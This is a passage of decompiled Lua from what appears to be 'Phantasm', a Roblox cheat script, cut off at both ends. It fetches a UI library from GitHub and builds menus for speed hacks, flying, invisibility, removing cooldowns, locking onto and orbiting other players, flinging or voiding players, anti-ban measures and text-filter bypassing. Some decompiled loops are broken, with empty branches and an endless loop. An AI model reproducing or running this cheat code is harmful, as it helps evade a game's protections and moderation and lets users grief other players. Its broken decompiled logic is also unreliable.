            Workspace.FallenPartsDestroyHeight = 0 / 0
            worldConnections[# worldConnections + 1] = Workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
                Workspace.FallenPartsDestroyHeight = 0 / 0
            end)
            local tmp476 = "https://raw.githubusercontent.com/secretisadev/Obsidian/refs/heads/main/"
            if not isfolder("Obsidian") then
                LoadingLabel.Text = "Creating \'Obsidian\'"
                makefolder("Obsidian")
            end
            if not isfile("Obsidian/Library.lua") then
                LoadingLabel.Text = "Downloading \'Library.lua\'"
                writefile("Obsidian/Library.lua", game:HttpGet(tmp476 .. "Library.lua"))
            end
            if not isfile("Obsidian/ThemeManager.lua") then
                LoadingLabel.Text = "Downloading \'ThemeManager.lua\'"
                writefile("Obsidian/ThemeManager.lua", game:HttpGet(tmp476 .. "addons/ThemeManager.lua"))
            end
            if not isfile("Obsidian/SaveManager.lua") then
                LoadingLabel.Text = "Downloading \'SaveManager.lua\'"
                writefile("Obsidian/SaveManager.lua", game:HttpGet(tmp476 .. "addons/SaveManager.lua"))
            end
            LoadingLabel.Text = "Loading UI"
            
--[[ 21. UI LIBRARY ]]
local UILib = loadfile("Obsidian/Library.lua")()
            local ThemeManager = loadfile("Obsidian/ThemeManager.lua")()
            local SaveManager = loadfile("Obsidian/SaveManager.lua")()
            
--[[ 20. MOVE NOTIFY ]]
function MoveNotify(notifyPlayer, moveName)
                if rawget(Options.MoveNotificationMoves.Value, moveName) then
                    if Toggles.MoveNotifications.Value then
                        UILib:Notify({
                            Title = bypassText("Move Notification"),
                            Description = bypassText(notifyPlayer.DisplayName .. " used " .. moveName),
                            Time = 5,
                            SoundId = SoundIds.Notification
                        })
                    end
                    if Toggles.ExposeMoveInChat.Value and not (Toggles.ExposeWhitelistedPlayers.Value and table.find(whitelistedPlayers, notifyPlayer)) then
                        sendMsg("\239\191\189\239\191\189\239\184\143 " .. notifyPlayer.DisplayName .. " used " .. moveName .. " \226\154\160\239\184\143")
                    end
                end
            end
            local libRef = UILib
            local Window = UILib.CreateWindow(libRef, {
                Title = bypassText("Phantasm"),
                Footer = bypassText("Old test version, Do not expect updates. | discord.gg/phantasm"),
                NotifySide = "Right",
                ShowCustomCursor = true,
                AutoShow = true,
                Center = true,
                Resizable = true
            })
            local Tabs = {
                Information = Window:AddTab(bypassText("Information"), "book"),
                LocalPlayer = Window:AddTab(bypassText("Local Player"), "user"),
                Exploits = Window:AddTab(bypassText("Exploits"), "skull"),
                Visuals = Window:AddTab(bypassText("Visuals"), "eye"),
                Commands = Window:AddTab("Commands", "code"),
                Map = Window:AddTab(bypassText("Map"), "map"),
                Disguise = Window:AddTab(bypassText("Disguise"), "users"),
                Misc = Window:AddTab(bypassText("Miscallenous"), "ellipsis"),
                ["UI Settings"] = Window:AddTab(bypassText("UI Settings"), "settings")
            }
            local UpdateLogBox = Tabs.Information:AddLeftGroupbox(bypassText("Update Log"))
            local LocalPlayerTabbox = Tabs.LocalPlayer:AddLeftTabbox()
            local MovementTab = LocalPlayerTabbox:AddTab(bypassText("Movement"))
            local CharacterTab = LocalPlayerTabbox:AddTab(bypassText("Character"))
            local KeybindsBox = Tabs.LocalPlayer:AddLeftGroupbox(bypassText("Keybinds"))
            local AutomationBox = Tabs.LocalPlayer:AddRightGroupbox(bypassText("Automation"))
            local DashesBox = Tabs.LocalPlayer:AddRightGroupbox(bypassText("Dashes"))
            local ExploitsMainBox = Tabs.Exploits:AddLeftGroupbox(bypassText("Main"))
            local WallComboBox = Tabs.Exploits:AddRightGroupbox(bypassText("Wall Combo"))
            local AntisBox = Tabs.Exploits:AddLeftGroupbox(bypassText("Anti\'s"))
            local InvisibleMovesBox = Tabs.Exploits:AddRightGroupbox(bypassText("Invisible Moves"))
            local VisualsMainBox = Tabs.Visuals:AddLeftGroupbox(bypassText("Main"))
            local ESPBox = Tabs.Visuals:AddRightGroupbox(bypassText("ESP"))
            local WorldBox = Tabs.Visuals:AddRightGroupbox(bypassText("World"))
            local CmdSettingsBox = Tabs.Commands:AddLeftGroupbox("Settings")
            local CommandsBox = Tabs.Commands:AddRightGroupbox("Commands")
            local TeleportsBox = Tabs.Map:AddLeftGroupbox(bypassText("Teleports"))
            local PlayersMapBox = Tabs.Map:AddRightGroupbox(bypassText("Players"))
            local AntiBanBox = Tabs.Misc:AddLeftGroupbox(bypassText("Anti Ban"))
            local ScriptsBox = Tabs.Misc:AddLeftGroupbox(bypassText("Scripts"))
            local AnimsBox = Tabs.Misc:AddRightGroupbox(bypassText("Animations"))
            local ExtraBox = Tabs.Misc:AddRightGroupbox(bypassText("Extra"))
            local UISettingsBox = Tabs["UI Settings"]:AddLeftGroupbox(bypassText("Settings"))
            Options = UILib.Options
            Toggles = UILib.Toggles
            Labels = UILib.Labels
            task.spawn(function()
                local tmp508 = game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Update Log")
                if tmp508 then
                    local tmp509 = tmp508:split("\n")
                    local tmp510, tmp511, tmp512 = pairs(tmp509)
                    local tmp513 = ""
                    while true do
                        local tmp514
                        tmp512, tmp514 = tmp510(tmp511, tmp512)
                        if tmp512 == nil then
                            break
                        end
                        if tmp514:sub(1, 2) ~= "+ " then
                            if tmp514:sub(1, 2) ~= "- " then
                                tmp513 = tmp513 .. tmp514
                            else
                                tmp513 = tmp513 .. formatRichText(255, 65, 65, tmp514)
                            end
                        else
                            tmp513 = tmp513 .. formatRichText(200, 255, 100, tmp514)
                        end
                        if tmp512 ~= # tmp513 then
                            tmp513 = tmp513 .. "\n"
                        end
                    end
                    UpdateLogBox:AddLabel({
                        Text = tmp513,
                        DoesWrap = true,
                        Size = 12
                    })
                end
            end)
            CmdSettingsBox:AddToggle("CommandBar", {
                Text = "Command Bar",
                Default = false
            }):AddKeyPicker("CommandBind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "Semicolon",
                Text = "Command Bar Keybind",
                NoUI = true
            })
            CmdSettingsBox:AddToggle("UseCommandsinChat", {
                Text = "Use Commands in Chat",
                Default = false
            })
            CmdSettingsBox:AddToggle("SendCommandInChat", {
                Text = "Send Command In Chat",
                Default = false
            })
            CmdSettingsBox:AddDivider()
            CmdSettingsBox:AddDropdown("FlingType", {
                Values = {
                    "Anti-Fling",
                    "Normal",
                    "Void"
                },
                Default = "Void",
                Text = "Fling Type"
            })
            CmdSettingsBox:AddSlider("FlingSpeed", {
                Text = "Fling Speed",
                Default = 15,
                Min = 15,
                Max = 90,
                Rounding = 0,
                Compact = true
            })
            CmdSettingsBox:AddSlider("FlingTimeout", {
                Text = "Fling Timeout",
                Default = 3,
                Min = 1,
                Max = 5,
                Rounding = 0,
                Compact = true
            })
            CommandsBox:AddLabel(";safezone\r\n;goto/tp/to {player}\r\n;say {message}\r\n;fling/void {player, all, others}\r\n;loopfling/loopvoid {player, all, others}\r\n;unfling/unvoid/unloopfling/unloopvoid {player, all, others}\r\n;view/spectate {player}\r\n;unview/unspectate\r\n;whitelist/addwhitelist\r\n;unwhitelist/removewhitelist\r\n;rejoin/rj\r\n;reset\r\n;fixcam\r\n;vclip {number}\r\n;hclip {number}", true)
            MovementTab:AddToggle("SpeedHackEnabled", {
                Text = bypassText("Speed Hack Enabled"),
                Default = false
            })
            MovementTab:AddSlider("SpeedHack", {
                Text = bypassText("Speed"),
                Default = 1,
                Min = 1,
                Max = 25000,
                Rounding = 1,
                Compact = true
            })
            MovementTab:AddDropdown("SpeedHackMethod", {
                Values = {
                    "CFrame",
                    "Velocity"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Speed Hack Method")
            })
            MovementTab:AddToggle("UpsideDown", {
                Text = bypassText("Upside Down"),
                Default = false,
                Callback = function(arg515)
                    Heartbeat:Wait()
                    FeatureFlags["Upside Down"] = arg515
                end
            })
            CharacterTab:AddToggle("Invisibility", {
                Text = bypassText("Invisibility"),
                Default = false,
                Callback = function(arg516)
                    Heartbeat:Wait()
                    FeatureFlags.Invisibility = arg516
                end
            })
            CharacterTab:AddToggle("M1Reset", {
                Text = bypassText("M1 Reset / No Dash Debounce"),
                Default = false
            })
            CharacterTab:AddToggle("EmoteDash", {
                Text = bypassText("Emote Dash"),
                Default = false
            })
            CharacterTab:AddDropdown("CharacterExploits", {
                Values = {
                    "No Dash Cooldown",
                    "No Stun",
                    "No Slow",
                    "No Fatigue",
                    "No Jump Bypass",
                    "No Rotations Bypass",
                    "Anti Ragdoll"
                },
                Default = {},
                Multi = true,
                Searchable = false,
                Text = bypassText("Character Exploits"),
                Callback = function(arg517)
                    workspace:SetAttribute("NoDashCooldown", false)
                    workspace:SetAttribute("NoFatigue", false)
                    if rawget(arg517, "No Dash Cooldown") then
                        workspace:SetAttribute("NoDashCooldown", true)
                    elseif rawget(arg517, "No Fatigue") then
                        workspace:SetAttribute("NoFatigue", true)
                    elseif rawget(arg517, "No Rotations Bypass") then
                        deleteAllInstances(nil, "NoRotate")
                    end
                end
            })
            CharacterTab:AddToggle("AutoRagdollCancel", {
                Text = bypassText("Auto Ragdoll Cancel"),
                Default = false
            })
            CharacterTab:AddToggle("RagdollHide", {
                Text = bypassText("Ragdoll Hide"),
                Default = false
            })
            CharacterTab:AddToggle("LaunchHide", {
                Text = bypassText("Launch Hide"),
                Default = false
            })
            workspace:SetAttribute("EffectAffects", 1)
            worldConnections[# worldConnections + 1] = workspace.AttributeChanged:Connect(function(arg518)
                if arg518 == "NoDashCooldown" then
                    workspace:SetAttribute(arg518, rawget(Options.CharacterExploits.Value, "No Dash Cooldown") and true or false)
                elseif arg518 == "NoFatigue" then
                    workspace:SetAttribute(arg518, rawget(Options.CharacterExploits.Value, "No Fatigue") and true or false)
                elseif arg518 == "EffectsAffect" then
                    workspace:SetAttribute("EffectAffects", 1)
                end
            end)
            AutomationBox:AddToggle("AutoFrozenSoul", {
                Text = bypassText("Auto Frozen Soul"),
                Default = false,
                Callback = function(arg519)
                    if arg519 then
                        local function tmp523(arg520)
                            Stepped:Wait()
                            if arg520.Name == "Frozen Lock" and arg520:FindFirstChild("Root") then
                                local tmp521 = arg520.Root
                                local tmp522 = tick()
                                repeat
                                    heartbeatTp(tmp521.CFrame * CFrame.new(0, 3, 0))
                                    RenderStepped:Wait()
                                until tick() >= tmp522 + 10 or not (arg520.Parent and Toggles.AutoFrozenSoul.Value)
                            end
                        end
                        if debrisFolder:FindFirstChild("Frozen Lock") then
                            task.spawn(tmp523, debrisFolder["Frozen Lock"])
                        end
                        local tmp524 = debrisFolder.ChildAdded:Connect(tmp523)
                        repeat
                            RenderStepped:Wait()
                        until not Toggles.AutoFrozenSoul.Value
                        tmp524:Disconnect()
                    end
                end
            })
            AutomationBox:AddButton({
                Text = bypassText("Free Stargazer / Nightchild"),
                Callback = function()
                    communicate({
                        Goal = "Gaze"
                    })
                end
            })
            DashesBox:AddToggle("CustomFrontDash", {
                Text = bypassText("Custom Front Dash"),
                Tooltip = bypassText("Makes your front dashes go slightly further."),
                Default = false
            })
            DashesBox:AddSlider("FDDistance", {
                Text = bypassText("Front Dash Distance"),
                Default = 165,
                Min = 0,
                Max = 500,
                Rounding = 1
            })
            DashesBox:AddToggle("CustomSideDash", {
                Text = bypassText("Custom Side Dash"),
                Tooltip = bypassText("Makes your side dashes go slightly further."),
                Default = false
            })
            DashesBox:AddSlider("SDDistance", {
                Text = bypassText("Side Dash Distance (Multiplier)"),
                Default = 1,
                Min = 0.1,
                Max = 2,
                Rounding = 1
            })
            DashesBox:AddSlider("SDSpeed", {
                Text = bypassText("Side Dash Speed"),
                Default = 1,
                Min = 0.1,
                Max = 2,
                Rounding = 1
            })
            DashesBox:AddToggle("CustomBackDash", {
                Text = bypassText("Custom Back Dash"),
                Tooltip = bypassText("Makes your back dashes go slightly further."),
                Default = false
            })
            DashesBox:AddSlider("BDDistance", {
                Text = bypassText("Back Dash Distance (Multiplier)"),
                Default = 1,
                Min = 0.1,
                Max = 2,
                Rounding = 1
            })
            DashesBox:AddButton({
                Text = bypassText("Reset to Defaults"),
                Callback = function()
                    Options.FDDistance:SetValue(165)
                    Options.SDDistance:SetValue(1)
                    Options.SDSpeed:SetValue(1)
                    Options.BDDistance:SetValue(1)
                end
            })
            local up525 = {
                Fly = false,
                ["Lock-on"] = false,
                Orbit = false,
                ["Velocity Spoof"] = false,
                ["TP 1"] = false,
                ["TP 2"] = false
            }
            KeybindsBox:AddToggle("Fly", {
                Text = bypassText("Fly"),
                Default = false,
                Callback = function(arg526)
                    if not arg526 and Options.FlyBind:GetState() == true then
                        Options.FlyBind.Toggled = false
                        Options.FlyBind:DoClick()
                    end
                end
            }):AddKeyPicker("FlyBind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "Y",
                Text = bypassText("Fly"),
                Callback = function(arg527)
                    if up525.Fly then
                        return
                    end
                    if arg527 and not Toggles.Fly.Value then
                        RenderStepped:Wait()
                        up525.Fly = true
                        Options.FlyBind.Toggled = false
                        Options.FlyBind:DoClick()
                        up525.Fly = false
                        return
                    end
                    if Toggles.Fly.Value then
                        FeatureFlags.Flying = not FeatureFlags.Flying
                        UILib:Notify({
                            Title = bypassText("Fly"),
                            Description = bypassText("Toggled ") .. (arg527 and "on \226\156\133" or "off \226\157\140"),
                            Time = 2,
                            SoundId = SoundIds.Notification
                        })
                        if not FeatureFlags.Flying then
                        end
                        local up528 = nil
                        local tmp529 = getChar(LocalPlayer)
                        local tmp530
                        if tmp529 then
                            tmp530 = getHumanoid(tmp529)
                        else
                            tmp530 = tmp529
                        end
                        local tmp531
                        if tmp529 then
                            tmp531 = getRoot(tmp529)
                        else
                            tmp531 = tmp529
                        end
                        if tmp529 and (tmp531 and tmp530) then
                            up528 = tmp531.CFrame
                        end
                        local tmp546 = Heartbeat:Connect(function(arg532)
                            local tmp533 = getChar(LocalPlayer)
                            local tmp534
                            if tmp533 then
                                tmp534 = getHumanoid(tmp533)
                            else
                                tmp534 = tmp533
                            end
                            local tmp535
                            if tmp533 then
                                tmp535 = getRoot(tmp533)
                            else
                                tmp535 = tmp533
                            end
                            local tmp536 = workspace.CurrentCamera
                            if tmp533 and (tmp535 and (tmp534 and tmp536)) then
                                local tmp537 = Options.FlySpeed.Value / 100
                                local tmp538 = Vector3.new(0, 0, 0)
                                CFrame.new(0, 0, 0)
                                local tmp539 = tmp536.CFrame
                                local tmp540 = tmp539.LookVector
                                local tmp541 = tmp539.RightVector
                                local tmp542 = CFrame.new(tmp535.Position, tmp535.Position + Vector3.new(tmp540.X, 0, tmp540.Z))
                                local tmp543 = math.round((tmp534.MoveDirection:Dot(tmp542.LookVector)))
                                local tmp544 = math.round((tmp534.MoveDirection:Dot(tmp542.RightVector)))
                                if tmp543 == 1 then
                                    tmp538 = tmp538 + tmp540 * tmp537
                                    local _ = tmp535.CFrame + tmp540 * (arg532 * tmp537)
                                end
                                if tmp543 == - 1 then
                                    tmp538 = tmp538 + tmp540 * - tmp537
                                    local _ = tmp535.CFrame + - tmp540 * (arg532 * tmp537)
                                end
                                if tmp544 == - 1 then
                                    tmp538 = tmp538 + tmp541 * - tmp537
                                    local _ = tmp535.CFrame + - tmp541 * (arg532 * tmp537)
                                end
                                if tmp544 == 1 then
                                    tmp538 = tmp538 + tmp541 * tmp537
                                    local _ = tmp535.CFrame + tmp541 * (arg532 * tmp537)
                                end
                                if tmp543 == 0 and tmp544 == 0 then
                                    tmp535.Velocity = Vector3.new()
                                    tmp535.CFrame = up528 or tmp535.CFrame
                                else
                                    tmp535.Velocity = tmp538
                                    up528 = tmp535.CFrame
                                end
                                tmp535.RotVelocity = Vector3.new()
                                local tmp545 = Options.FlyRotations.Value
                                if tmp545 == "Horizontal" then
                                    tmp535.CFrame = CFrame.new(tmp535.Position, tmp535.Position + Vector3.new(tmp540.X, 0, tmp540.Z))
                                elseif tmp545 == "Vertical & Horizontal" then
                                    tmp535.CFrame = CFrame.new(tmp535.CFrame.Position, tmp535.CFrame.Position + tmp539.LookVector)
                                end
                            end
                        end)
                        repeat
                            task.wait()
                        until not (FeatureFlags.Flying and Toggles.Fly.Value)
                        FeatureFlags.Flying = false
                        tmp546:Disconnect()
                        local tmp547 = getChar(LocalPlayer)
                        local tmp548
                        if tmp547 then
                            tmp548 = getRoot(tmp547)
                        else
                            tmp548 = tmp547
                        end
                        local tmp549
                        if tmp547 then
                            tmp549 = getHumanoid(tmp547)
                        else
                            tmp549 = tmp547
                        end
                        if tmp547 and (tmp548 and (tmp549 and not tmp549.SeatPart)) then
                            local tmp550 = tick()
                            tmp548.Velocity = Vector3.new()
                            if tmp548.Velocity.Magnitude <= 5 or tick() >= tmp550 + 1 then
                            end
                        end
                        if not (tmp549 and tmp549.SeatPart) then
                        end
                        local tmp551 = tick()
                        while true do
                            if tmp549.SeatPart then
                                tmp549.SeatPart.Velocity = Vector3.new()
                            end
                            if tmp549.SeatPart and tmp549.SeatPart.Velocity.Magnitude <= 5 or (not tmp549.SeatPart or tick() >= tmp551 + 1) then
                            end
                        end
                    else
                        return
                    end
                end
            })
            KeybindsBox:AddSlider("FlySpeed", {
                Text = bypassText("Fly Speed"),
                Default = 10000,
                Min = 1,
                Max = 50000,
                Rounding = 1
            })
            KeybindsBox:AddDropdown("FlyRotations", {
                Values = {
                    "None",
                    "Horizontal",
                    "Vertical & Horizontal"
                },
                Default = {},
                Multi = false,
                Searchable = false,
                Text = bypassText("Fly Rotations")
            })
            KeybindsBox:AddDivider()
            KeybindsBox:AddToggle("AnimeTeleportation", {
                Text = bypassText("Anime Teleportation"),
                Default = false,
                Callback = function(arg552)
                    if not arg552 and Options.AnimeTPKeybind:GetState() == true then
                        Options.AnimeTPKeybind.Toggled = false
                        Options.AnimeTPKeybind:DoClick()
                    end
                end
            }):AddKeyPicker("AnimeTPKeybind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "T",
                Text = bypassText("Anime Teleportation"),
                Callback = function(_)
                    Options.AnimeTPKeybind.Toggled = false
                    if Toggles.AnimeTeleportation.Value and Mouse.Target then
                        local up553 = getChar(LocalPlayer)
                        local tmp554
                        if up553 then
                            tmp554 = getRoot(up553)
                        else
                            tmp554 = up553
                        end
                        local tmp555
                        if up553 then
                            tmp555 = getHumanoid(up553)
                        else
                            tmp555 = up553
                        end
                        if up553 and (tmp554 and tmp555) then
                            stopAllAnims(tmp555, {
                                "15957361339"
                            })
                            if Toggles.AnimeTPAnimation.Value then
                                local tmp556 = loadAnim(tmp555, "15957361339")
                                tmp556.Priority = Enum.AnimationPriority.Action2
                                tmp556:Play()
                                tmp556:AdjustSpeed(Options.AnimeTPSpeed.Value)
                            end
                            local tmp557 = tmp554.CFrame
                            heartbeatTp(CFrame.new(Mouse.Hit.Position, Vector3.new(tmp557.Position.X, Mouse.Hit.Position.Y, tmp557.Position.Z)) * CFrame.Angles(0, math.pi, 0))
                            local tmp558 = Options.AnimeTPSound.Value
                            if tmp558 == "Goku" then
                                local tmp559 = loadSound(tmp554, "4861638982")
                                tmp559.Volume = Options.AnimeTPVolume.Value
                                tmp559:Play()
                            elseif tmp558 == "Goku Black" then
                                local tmp560 = loadSound(tmp554, "9010221848")
                                tmp560.Volume = Options.AnimeTPVolume.Value
                                tmp560:Play()
                                tmp560.TimePosition = 0.4
                            end
                            local tmp561 = ReplicatedStorage.Resources.KJEffects.tpthing:Clone()
                            tmp561.Parent = tmp554
                            tmp561:Emit(15)
                            Debris:AddItem(tmp561, 1)
                            local tmp562, tmp563, tmp564 = pairs(up553:GetDescendants())
                            while true do
                                local up565
                                tmp564, up565 = tmp562(tmp563, tmp564)
                                if tmp564 == nil then
                                    break
                                end
                                if up565:IsA("BasePart") and (up565 ~= tmp554 and up565.Transparency ~= 1) and not up565.Name:lower():find("hitbox") then
                                    task.spawn(function()
                                        up565.Transparency = 1
                                        task.delay(0.1, function()
                                            if FeatureFlags.Invisibility or getgenv().desync and not up553:FindFirstChild("AbsoluteImmortal") then
                                                up565.Transparency = 0.5
                                            else
                                                up565.Transparency = 0
                                            end
                                        end)
                                        local tmp566 = up565:FindFirstChildWhichIsA("Decal")
                                        if tmp566 and tmp566.Transparency ~= 1 then
                                            local tmp567 = tmp566.Transparency
                                            tmp566.Transparency = 1
                                            task.wait(0.1)
                                            tmp566.Transparency = tmp567
                                        end
                                    end)
                                end
                            end
                        end
                    end
                end
            })
            KeybindsBox:AddToggle("AnimeTPAnimation", {
                Text = bypassText("Teleport Animation"),
                Default = false
            })
            KeybindsBox:AddDropdown("AnimeTPSound", {
                Values = {
                    "None",
                    "Goku",
                    "Goku Black"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Teleport Sound")
            })
            KeybindsBox:AddSlider("AnimeTPVolume", {
                Text = bypassText("Sound Volume"),
                Default = 10,
                Min = 1,
                Max = 10,
                Rounding = 1
            })
            KeybindsBox:AddSlider("AnimeTPSpeed", {
                Text = bypassText("Animation Speed"),
                Default = 1,
                Min = 0.5,
                Max = 5,
                Rounding = 1
            })
            KeybindsBox:AddDivider()
            KeybindsBox:AddToggle("Lock-on", {
                Text = bypassText("Lock-on"),
                Default = false,
                Callback = function(arg568)
                    if not arg568 and Options["L-OnKeybind"]:GetState() == true then
                        Options["L-OnKeybind"].Toggled = false
                        Options["L-OnKeybind"]:DoClick()
                    end
                end
            }):AddKeyPicker("L-OnKeybind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "V",
                Text = bypassText("Lock-on"),
                Callback = function(arg569)
                    if up525["Lock-on"] then
                        return
                    end
                    if arg569 and not Toggles["Lock-on"].Value then
                        RenderStepped:Wait()
                        up525["Lock-on"] = true
                        Options["L-OnKeybind"].Toggled = false
                        Options["L-OnKeybind"]:DoClick()
                        up525["Lock-on"] = false
                        return
                    end
                    local tmp570 = closestPlayerV2(true)
                    if tmp570 and (arg569 and Toggles["Lock-on"].Value) then
                        while true do
                            if true then
                                local tmp571 = getChar(LocalPlayer)
                                local tmp572
                                if tmp571 then
                                    tmp572 = getRoot(tmp571)
                                else
                                    tmp572 = tmp571
                                end
                            end
                            local tmp573
                            if tmp571 then
                                tmp573 = getHumanoid(tmp571)
                            else
                                tmp573 = tmp571
                            end
                            local tmp574
                            if tmp570 then
                                tmp574 = getChar(tmp570)
                            else
                                tmp574 = tmp570
                            end
                            local tmp575
                            if tmp574 then
                                tmp575 = getRoot(tmp574)
                            else
                                tmp575 = tmp574
                            end
                            local tmp576
                            if tmp574 then
                                tmp576 = getHumanoid(tmp574)
                            else
                                tmp576 = tmp574
                            end
                            if tmp571 and (tmp572 and (tmp573 and (tmp570 and (tmp574 and (tmp575 and (tmp576 and tmp573.Health > 0)))))) then
                                tmp573.AutoRotate = false
                                local tmp577 = tmp574:FindFirstChildWhichIsA("Highlight") or Instance.new("Highlight", tmp574)
                                tmp577.FillTransparency = 0.8
                                tmp577.OutlineTransparency = 0
                                tmp577.DepthMode = "AlwaysOnTop"
                                tmp577.FillColor = Color3.fromRGB(255, 0, 0)
                                tmp577.OutlineColor = Color3.fromRGB(255, 0, 0)
                                local tmp578 = tmp572.Position
                                local tmp579 = tmp575.Position
                                local _ = tmp575.Velocity
                                local tmp580 = Toggles["Auto_Lock-on_Prediction"].Value and Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 or Options["Lock-on_Prediction"].Value
                                local tmp581 = Vector3.new(tmp579.X, FeatureFlags.Flying and tmp579.Y or tmp578.Y, tmp579.Z) + tmp576.MoveDirection * tmp575.Velocity.Magnitude * 0.1
                                if Toggles["Auto_Lock-on_Prediction"].Value then
                                    Options["Lock-on_Prediction"]:SetValue(tonumber(string.format("%.1f", tmp580)))
                                end
                                if not tmp571:FindFirstChild("Ragdoll") then
                                    tmp572.CFrame = CFrame.new(tmp578, tmp581)
                                end
                            end
                            RenderStepped:Wait()
                            if Options["L-OnKeybind"]:GetState() == false or tmp570 and not tmp570.Parent or not tmp570 then
                                local tmp582 = getChar(LocalPlayer)
                                local tmp583
                                if tmp582 then
                                    tmp583 = getRoot(tmp582)
                                else
                                    tmp583 = tmp582
                                end
                                local tmp584
                                if tmp582 then
                                    tmp584 = getHumanoid(tmp582)
                                else
                                    tmp584 = tmp582
                                end
                                if tmp582 and (tmp583 and tmp584) then
                                    tmp584.AutoRotate = true
                                end
                                local tmp585
                                if tmp570 then
                                    tmp585 = getChar(tmp570)
                                else
                                    tmp585 = tmp570
                                end
                                local tmp586
                                if tmp585 then
                                    tmp586 = tmp585:FindFirstChildWhichIsA("Highlight")
                                else
                                    tmp586 = tmp585
                                end
                                if tmp570 and (tmp585 and tmp586) then
                                    if getHighestStreak() ~= tmp570 or (10 > (tmp585:GetAttribute("CurrentStreak") or 0) or tmp570:GetAttribute("S_HideStreak")) then
                                        tmp586.FillTransparency = 1
                                        tmp586.OutlineTransparency = 1
                                        tmp586.DepthMode = "Occluded"
                                        tmp586.FillColor = Color3.fromRGB(255, 255, 255)
                                        tmp586.OutlineColor = Color3.fromRGB(255, 255, 255)
                                    else
                                        tmp586.FillTransparency = 1
                                        tmp586.OutlineTransparency = 0
                                        tmp586.DepthMode = "Occluded"
                                        tmp586.FillColor = Color3.fromRGB(255, 255, 0)
                                        tmp586.OutlineColor = Color3.fromRGB(255, 255, 0)
                                    end
                                end
                            end
                        end
                    else
                        return
                    end
                end
            })
            KeybindsBox:AddSlider("Lock-on_Prediction", {
                Text = bypassText("Prediction"),
                Default = 0.1,
                Min = 0.1,
                Max = 1,
                Rounding = 1,
                Compact = true
            })
            KeybindsBox:AddToggle("Auto_Lock-on_Prediction", {
                Text = bypassText("Auto Prediction"),
                Default = false
            })
            KeybindsBox:AddDivider()
            KeybindsBox:AddToggle("Orbit", {
                Text = bypassText("Orbit"),
                Default = false,
                Callback = function(arg587)
                    if not arg587 and Options.OrbitBind:GetState() == true then
                        Options.OrbitBind.Toggled = false
                        Options.OrbitBind:DoClick()
                    end
                end
            }):AddKeyPicker("OrbitBind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "H",
                Text = bypassText("Orbit"),
                Callback = function(arg588)
                    if up525.Orbit then
                        return
                    end
                    if arg588 and not Toggles.Orbit.Value then
                        RenderStepped:Wait()
                        up525.Orbit = true
                        Options.OrbitBind.Toggled = false
                        Options.OrbitBind:DoClick()
                        up525.Orbit = false
                        return
                    end
                    local tmp589 = closestPlayerV2(true)
                    if tmp589 and (arg588 and Toggles.Orbit.Value) then
                        local tmp590 = nil
                        local tmp591 = getChar(LocalPlayer)
                        local tmp592
                        if tmp591 then
                            tmp592 = getRoot(tmp591)
                        else
                            tmp592 = tmp591
                        end
                        local tmp593
                        if tmp591 then
                            tmp593 = getHumanoid(tmp591)
                        else
                            tmp593 = tmp591
                        end
                        if tmp591 and (tmp592 and tmp593) then
                            tmp590 = tmp592.CFrame
                        end
                        UILib:Notify({
                            Title = bypassText("Orbit"),
                            Description = bypassText("Toggled on ") .. "\239\191\189\239\191\189",
                            Time = 2,
                            SoundId = SoundIds.Notification
                        })
                        local tmp594 = 0
                        while true do
                            if true then
                                local tmp595 = getChar(LocalPlayer)
                                local tmp596
                                if tmp595 then
                                    tmp596 = getRoot(tmp595)
                                else
                                    tmp596 = tmp595
                                end
                            end
                            local tmp597
                            if tmp595 then
                                tmp597 = getHumanoid(tmp595)
                            else
                                tmp597 = tmp595
                            end
                            local tmp598
                            if tmp589 then
                                tmp598 = getChar(tmp589)
                            else
                                tmp598 = tmp589
                            end
                            local tmp599
                            if tmp598 then
                                tmp599 = getRoot(tmp598)
                            else
                                tmp599 = tmp598
                            end
                            local tmp600
                            if tmp598 then
                                tmp600 = getHumanoid(tmp598)
                            else
                                tmp600 = tmp598
                            end
                            if tmp595 and (tmp596 and (tmp597 and (tmp589 and (tmp598 and (tmp599 and tmp600))))) then
                                local tmp601 = Workspace.CurrentCamera
                                if tmp601 and tmp601.CameraSubject ~= tmp600 then
                                    tmp601.CameraSubject = tmp600
                                end
                                local tmp602 = Options.OrbitSpeed.Value
                                local tmp603 = Options.OrbitDistance.Value
                                tmp594 = tmp594 + tmp602
                                if not FeatureFlags["Pause Orbit"] then
                                    local tmp604 = tmp599.Position + tmp600.MoveDirection * tmp599.Velocity.Magnitude / 2.75
                                    local tmp605 = CFrame.Angles(0, math.rad(tmp594), 0) * CFrame.new(tmp603, 0, 0)
                                    tmp596.CFrame = CFrame.lookAt(tmp596.Position, Vector3.new(tmp604.X, tmp596.Position.Y, tmp604.Z))
                                    task.wait()
                                    tmp596.CFrame = CFrame.new(tmp604.X, tmp599.Position.Y, tmp604.Z) * tmp605
                                end
                            end
                            RenderStepped:Wait()
                            if Options.OrbitBind:GetState() == false or tmp589 and not tmp589.Parent or not tmp589 then
                                UILib:Notify({
                                    Title = bypassText("Orbit"),
                                    Description = bypassText("Toggled off ") .. "\239\191\189\239\191\189",
                                    Time = 2,
                                    SoundId = SoundIds.Notification
                                })
                                local tmp606 = Workspace.CurrentCamera
                                local tmp607 = getChar(LocalPlayer)
                                local tmp608
                                if tmp607 then
                                    tmp608 = getRoot(tmp607)
                                else
                                    tmp608 = tmp607
                                end
                                local tmp609
                                if tmp607 then
                                    tmp609 = getHumanoid(tmp607)
                                else
                                    tmp609 = tmp607
                                end
                                local tmp610
                                if tmp589 then
                                    tmp610 = getChar(tmp589)
                                else
                                    tmp610 = tmp589
                                end
                                local tmp611
                                if tmp610 then
                                    tmp611 = getRoot(tmp610)
                                else
                                    tmp611 = tmp610
                                end
                                local tmp612
                                if tmp610 then
                                    tmp612 = getHumanoid(tmp610)
                                else
                                    tmp612 = tmp610
                                end
                                if tmp607 and (tmp608 and (tmp609 and (tmp589 and (tmp610 and (tmp611 and tmp612))))) then
                                    if tmp606 and tmp606.CameraSubject == tmp612 then
                                        tmp606.CameraSubject = tmp609
                                    end
                                elseif tmp607 and (tmp608 and tmp609) then
